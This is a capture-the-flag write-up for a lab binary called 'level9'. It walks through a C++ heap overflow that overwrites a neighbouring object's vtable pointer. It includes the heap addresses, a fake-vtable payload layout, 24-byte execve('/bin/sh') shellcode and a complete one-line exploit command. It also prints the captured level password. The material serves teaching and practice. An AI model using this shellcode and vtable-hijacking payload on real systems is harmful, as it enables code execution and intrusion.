# 🎯 Level9 - C++ Vtable Hijacking

![Helldivers C++ Warfare](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExbWpoMWQ4cjQ0ZWU0M2hraHpsenloM2E4eTN4Y3hpaTIwZHgybmVpZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/rTAVMVAps9zsFINvxI/giphy.gif)

Object-oriented exploitation - hijack virtual function tables! 🔥

## 📋 Binary Analysis

### Class N Structure

```cpp
class N {
public:
    // Memory layout (108 bytes):
    // +0x00: vtable pointer (4 bytes)
    // +0x04: annotation buffer (100 bytes)
    // +0x68: int value (4 bytes)
    
    char annotation[100];
    int value;
    
    N(int n);
    void setAnnotation(char *str);
    int operator+(N &other);
    int operator-(N &other);
};
```

### Vulnerable Method

```cpp
void N::setAnnotation(char *str)
{
    memcpy(annotation, str, strlen(str));  // ⚠️ No bounds checking!
}
```

### Main Function

```cpp
int main(int argc, char **argv)
{
    N *obj1 = new N(5);  // heap: ~0x804a008
    N *obj2 = new N(6);  // heap: ~0x804a078
    
    obj1->setAnnotation(argv[1]);  // ⚠️ Overflow can reach obj2!
    obj2->operator+(*obj1);        // ⚠️ Virtual call uses corrupted vtable!
    
    return 0;
}
```

## 🚨 The Vulnerability

**Buffer overflow + vtable hijacking:**
- `setAnnotation()` copies without bounds check
- obj1's annotation buffer (100 bytes) can overflow into obj2
- obj2's vtable pointer (first 4 bytes of object) gets overwritten
- Virtual function call uses corrupted vtable → arbitrary code execution

**Constraint:** `strlen()` stops at null bytes, so all addresses must be null-free.

## 🎯 Address Discovery

### Step 1: Run ltrace

```bash
$ ltrace ./level9 AAAA
_Znwj(108, ...)  = 0x804a008  ← obj1
_Znwj(108, ...)  = 0x804a078  ← obj2
```

### Step 2: Calculate addresses

```
obj1 base:              0x804a008
obj1 annotation buffer: 0x804a00c (obj1 + 4) ← shellcode here
obj2 base:              0x804a078
obj2 vtable pointer:    0x804a078 (obj2 + 0) ← overwrite target
obj2 annotation buffer: 0x804a07c (obj2 + 4) ← use as fake vtable

Distance: 0x804a078 - 0x804a00c = 108 bytes
```

### Binary addresses (from Ghidra)

- Original vtable: `0x08048848`

### Final payload addresses

| Address | Encoding | Purpose |
|---------|----------|---------|
| `0x0804a00c` | `\x0c\xa0\x04\x08` | Shellcode location (obj1 annotation buffer) |
| `0x0804a07c` | `\x7c\xa0\x04\x08` | Fake vtable location (obj2 annotation buffer) |

Both are null-free! ✅

## 🔧 The Exploit Strategy

### What is a Vtable?

A **vtable (virtual table)** is a mechanism C++ uses to implement polymorphism and virtual functions.

**The Concept:**

When a C++ class has virtual functions, the compiler creates a hidden table of function pointers called a **vtable**. Each object of that class stores a pointer to this table as its first member.

**Memory Layout:**

```
C++ Object in Memory:
┌─────────────────────────────────┐
│ vtable pointer    [offset +0]   │ ← Points to vtable (4 bytes)
├─────────────────────────────────┤
│ member data       [offset +4]   │ ← Class member variables
│ ...                             │
└─────────────────────────────────┘

Vtable (in .rodata section):
┌─────────────────────────────────┐
│ function pointer [vtable +0]    │ → Address of method1()
├─────────────────────────────────┤
│ function pointer [vtable +4]    │ → Address of method2()
├─────────────────────────────────┤
│ function pointer [vtable +8]    │ → Address of method3()
└─────────────────────────────────┘
```

**How Virtual Calls Work:**

```cpp
obj->virtualMethod();  // C++ code
```

Translates to assembly:
```asm
mov edx, [obj]      ; 1. Load vtable pointer from object
mov edx, [edx]      ; 2. Load function pointer from vtable[0]
call edx            ; 3. Call the function
```

**Why This Matters for Exploitation:**

If we can overwrite an object's vtable pointer, we control where the program looks for function addresses. By pointing it to our controlled memory containing a shellcode address, we can hijack execution when a virtual function is called.

This is exactly what we do in level9: overwrite `obj2`'s vtable pointer to point to `obj2`'s own annotation buffer (which we control), and place our shellcode address there.

### C++ Virtual Call Mechanism

**Normal call:** `obj->method()` compiles to:
```asm
mov edx, [obj]      ; Load vtable pointer from object
mov edx, [edx]      ; Load function pointer from vtable
call edx            ; Call function
```

**Two indirections:** object → vtable → function

**Our exploit:** Overwrite obj2's vtable pointer to point to our controlled data (obj2's own annotation buffer), which contains our shellcode address.

### Memory Layout

**Before overflow:**
```
0x804a00c: obj1 annotation (100 bytes)
           └─ overflow 108 bytes ─┐
0x804a078: obj2 vtable → 0x08048848
0x804a07c: obj2 annotation
```

**After overflow:**
```
0x804a00c: [shellcode][padding..........]
           └───────── 108 bytes ─────────┘
0x804a078: [0x0804a07c] ← corrupted vtable pointer
0x804a07c: [0x0804a00c] ← fake vtable[0] = shellcode address
```

**Exploit flow:**
1. Write 116 bytes to obj1 annotation buffer
2. Bytes 108-111 overwrite obj2's vtable → point to `0x0804a07c`
3. Bytes 112-115 write to `0x0804a07c` → place shellcode address `0x0804a00c`
4. Call `obj2->operator+()` → reads corrupted vtable → jumps to shellcode

### Payload Structure

```
[24-byte shellcode] + [84-byte padding] + [fake_vtable_ptr] + [shellcode_addr]
        ↓                    ↓                  ↓                   ↓
    0x804a00c           fills space        0x804a07c           0x804a00c
    (bytes 0-23)      (bytes 24-107)    (bytes 108-111)     (bytes 112-115)
```

| Bytes | Content | Purpose |
|-------|---------|---------|
| 0-23 | Shellcode (24 bytes) | Executes `/bin/sh` |
| 24-107 | Padding (`\x90` * 84) | Fill space to reach offset 108 |
| 108-111 | `\x7c\xa0\x04\x08` | Fake vtable pointer → obj2's annotation buffer |
| 112-115 | `\x0c\xa0\x04\x08` | Shellcode address → obj1's annotation buffer |

**Why we need 2 addresses (fake vtable):**
- Virtual calls use double indirection: `obj → vtable → function`
- Can't point vtable directly to shellcode (CPU would read FROM shellcode bytes)
- Must point vtable to controlled memory containing the shellcode address
- Clever: we use obj2's own annotation buffer as the fake vtable

## 🔄 Complete Execution Flow

### Step-by-Step Breakdown

**1. Program Initialization:**
```cpp
int main(int argc, char **argv)
{
    N *obj1 = new N(5);  // Allocates 108 bytes at 0x804a008
    N *obj2 = new N(6);  // Allocates 108 bytes at 0x804a078
```

**Heap state after allocation:**
```
0x804a008: obj1 [vtable ptr: 0x08048848][annotation: empty...][value: 5]
0x804a078: obj2 [vtable ptr: 0x08048848][annotation: empty...][value: 6]
```

---

**2. Exploit Payload Delivered:**
```cpp
obj1->setAnnotation(argv[1]);  // Copies 116 bytes from argv[1]
```

**Payload breakdown:**
```
argv[1] = [shellcode (24)] + [NOPs (84)] + [fake vtable ptr (4)] + [shellcode addr (4)]
          └── 0-23 ──────┘   └─ 24-107 ──┘   └──── 108-111 ────┘   └──── 112-115 ───┘
```

**What setAnnotation() does:**
```cpp
void N::setAnnotation(char *str)
{
    memcpy(this->annotation, str, strlen(str));
    // Copies to 0x804a00c (obj1+4)
    // strlen() counts until '\0', so 116 bytes total
}
```

---

**3. Memory Corruption:**

**After memcpy completes:**
```
0x804a008: obj1 vtable ptr → 0x08048848 (unchanged)
0x804a00c: obj1 annotation → [shellcode][NOPs][continues into obj2...]
           │
           └─ Overflows beyond 100-byte buffer!

0x804a078: obj2 vtable ptr → 0x0804a07c (CORRUPTED! was 0x08048848)
           │                   └─ Now points to obj2's own annotation buffer
           │
0x804a07c: obj2 annotation → 0x0804a00c (shellcode address written here)
           └─ This is our FAKE VTABLE containing one entry: shellcode address
```

**Memory visualization:**
```
obj1 region (0x804a008 - 0x804a073):
  +0x00: [08 48 84 08]                     ← vtable ptr (unchanged)
  +0x04: [31 c0 99 50 68 2f 2f 73 68...]  ← shellcode starts here (0x804a00c)
  +0x1c: [90 90 90 90 90 90 90 90 90...]  ← NOPs fill to offset 108
  ...continuing through obj1 boundary...

obj2 region (0x804a078 - 0x804a0e3):
  +0x00: [7c a0 04 08]                     ← vtable ptr OVERWRITTEN! → 0x804a07c
  +0x04: [0c a0 04 08]                     ← annotation buffer = shellcode address
```

---

**4. Virtual Function Call:**
```cpp
obj2->operator+(*obj1);  // Triggers virtual function call
```

**Assembly execution (critical part):**
```asm
; Load obj2 pointer into eax
mov eax, [ebp-0xc]           ; eax = 0x804a078 (obj2 address)

; Load vtable pointer from obj2
mov edx, [eax]               ; edx = *(0x804a078) = 0x0804a07c (FAKE VTABLE!)
                             ; Should be 0x08048848, but we corrupted it

; Load function pointer from vtable[0]
mov edx, [edx]               ; edx = *(0x0804a07c) = 0x0804a00c (SHELLCODE!)
                             ; Reading from obj2's annotation buffer

; Call the function
call edx                     ; JUMP TO 0x0804a00c → SHELLCODE EXECUTES!
```

---

**5. Shellcode Execution:**

**CPU jumps to 0x804a00c:**
```asm
; Shellcode executes: execve("/bin/sh", NULL, NULL)
0x804a00c: xor    eax, eax         ; eax = 0
0x804a00e: cdq                     ; edx = 0
0x804a00f: push   eax              ; NULL terminator
0x804a010: push   0x68732f2f       ; "//sh"
0x804a015: push   0x6e69622f       ; "/bin"
0x804a01a: mov    ebx, esp         ; ebx → "/bin//sh"
0x804a01c: push   eax              ; NULL (argv[1])
0x804a01d: push   ebx              ; "/bin//sh" (argv[0])
0x804a01e: mov    ecx, esp         ; ecx → argv
0x804a020: mov    al, 0xb          ; eax = 11 (sys_execve)
0x804a022: int    0x80             ; System call!
```

---

**6. Shell Spawned:**
```bash
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

### Key Insight: The Double Indirection

**Why we can't just overwrite vtable pointer to shellcode address:**

```
❌ Wrong approach:
obj2 vtable ptr → 0x0804a00c (shellcode)
Virtual call: mov edx, [0x0804a00c]  ← Reads FROM shellcode bytes (garbage!)
            call edx                ← Jumps to garbage address → CRASH

✅ Correct approach:
obj2 vtable ptr → 0x0804a07c (fake vtable in obj2's annotation)
Virtual call: mov edx, [0x0804a07c]  ← Reads shellcode address: 0x0804a00c
            call edx                ← Jumps to shellcode → SUCCESS
```

The vtable is a **table of function pointers**, not a function itself. The CPU reads an address FROM the vtable, then calls that address. We must provide a fake table with our shellcode address in it.

### Shellcode

We use the same null-byte-free shellcode from **level2** (24 bytes):

```
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

> 💡 For detailed assembly breakdown, see [level2 documentation](../../level2/Ressources/README.md#the-shellcode).
>
> **Source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428) by Touhid M.Shaikh

## 💣 Execute the Exploit

```bash
./level9 $(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*84 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"')
```

**Expected output:**
```bash
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

> 💡 **Pro Tip**: When exploiting C++ programs, always check the vtable layout first. Understanding the object model is key to crafting precise exploits!

> ⚠️ **Security Note**: Modern C++ protections include CFI (Control Flow Integrity), vtable verification, and read-only vtables. Safe practices: use `std::string`, enable sanitizers, prefer smart pointers over raw memory management.

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
